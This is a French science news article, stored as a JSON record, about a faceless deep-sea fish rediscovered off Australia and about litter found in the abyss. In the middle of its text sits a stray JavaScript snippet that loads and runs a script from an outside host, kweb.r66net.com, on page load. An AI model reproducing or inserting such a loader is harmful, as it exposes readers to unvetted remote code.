{"title": "Un étrange poisson sans visage pêché dans les abysses, au large de l'Australie", "newspaper": "Futura Sciences", "author": "Xavier Demeersman", "date_publi": "02/06/2017", "content": "Quelle drôle de créature ! Ce poisson qui semble n'avoir ni yeux, ni bouche ni branchies a été remonté des abysses au large de l'Australie. Il s'agit en réalité d'une redécouverte, plus de 140 ans après sa première rencontre avec l'Homme. Les scientifiques qui sondent, depuis le 15 mai, cet habitat inexploré ont déjà recensé de nombreuses espèces inconnues jusqu'ici. Et aussi beaucoup de déchets. Sur  Terre , de nombreux territoires demeurent encore inexplorés. C'est le cas en particulier des  abysses , lesquels représentent tout de même la moitié des fonds océaniques. Là, de  mystérieuses créatures  comme ce  poisson  sans visage bravent les conditions extrêmes telles que l'absence de  lumière , des températures glaciales et une pression énorme. Mesurant 40 cm, ce poisson qui pourrait faire penser à un bébé Alien de la saga éponyme est en réalité une redécouverte. La première et dernière fois que l'espèce humaine l'a croisé dans les eaux au large de l'Australie, c'était il y a presque 144 ans, en 1873, lors de l'expédition pionnière du  Challenger  conduite alors par des Britanniques. Les premières analyses  génétiques  ont en effet révélé qu'il s'agit d'un  Typhlonus nasus  ou « brosme sans tête ». Même si cet animal étrange est rarement rencontré, il est plutôt répandu dans les fonds océaniques, de la mer d'Oman au Japon, en passant par l'Indonésie et Hawaï, rapporte le site  Mashable . À la tête de la campagne d'exploration  Sampling  the Abyss  à laquelle participent 27 scientifiques pour une expédition d'un mois (du 15 mai au 16 juin) entre le nord de la Tasmanie et le Queensland, Tim O'Hara, s'est chargé de présenter présente «  ce petit poisson extraordinaire » .  « La bouche est en fait située sous l'animal, aussi quand vous le regardez de côté, vous ne voyez aucun  œil , ni  nez , ni  branchies , ni bouche. Il a l' air  de deux extrémités arrière d'un poisson... » , a-t-il rapporté au quotidien  The Gardian . Ce poisson sans yeux a été redécouvert au large de l’Australie. © Museums Victoria, CSIRO                               Plein de nouvelles espèces… et des déchets En l'espace de deux semaines, les explorateurs ont déjà fait de nombreuses découvertes. Certes, peut-être pas aussi  « spectaculaires »  que ce poisson mais tout aussi précieuse pour les chercheurs.  « Les experts m'ont dit qu'environ un tiers de tous les spécimens qui arrivent à bord sont totalement nouvelles pour la science, [...]. Il y a beaucoup de puces de mer, des vers, des crabes et d'autres choses que personne n'avait jamais vues auparavant. »  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : Déchets plastique dans l'océan : en 2050, il y en aura plus que de poissons Mais ils n'ont pas trouvé que cela... Loin d'être des havres de tranquillité, les abysses regorgent de nos  déchets . C'est tout aussi extraordinaire que ce poisson, souligne le chercheur du musée Victoria au  Guardian ,  « il y a même des restes de vieux navire à vapeur... Nous avons vu des tuyaux de  PVC  et des pots de peinture. C'est tout de même incroyable. Nous sommes au milieu de nulle part et le fond de l'océan est empli de  déchets  dont certains sont vieux de 200 ans » . Un terrifiant poisson des profondeurs pour la première fois en vidéo                       Poisson étonnant, de l'ordre des lophiiformes, le dragon des abysses utilise un organe lumineux pour attirer ses proies. L'animal est rare et très peu d’images le montrent évoluant dans son milieu naturel. Lors d’une exploration, l’institut de recherche de l’aquarium de Monterey Bay a ramené quelques images de cet étrange spécimen que nous vous invitons à découvrir en vidéo.                                       "}